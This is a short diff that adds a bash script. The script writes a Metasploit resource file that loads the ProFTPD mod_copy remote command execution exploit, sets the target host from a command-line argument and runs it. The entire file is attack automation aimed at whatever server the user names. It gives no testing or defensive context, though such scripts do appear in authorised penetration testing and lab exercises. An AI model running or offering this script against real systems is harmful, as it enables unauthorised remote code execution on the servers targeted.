@@ -1,0 +1,6 @@
+#!/usr/bin/bash
+echo """
+use exploit/unix/ftp/proftpd_modcopy_exec
+set RHOST $1
+exploit
+""" >> modcopy.rc
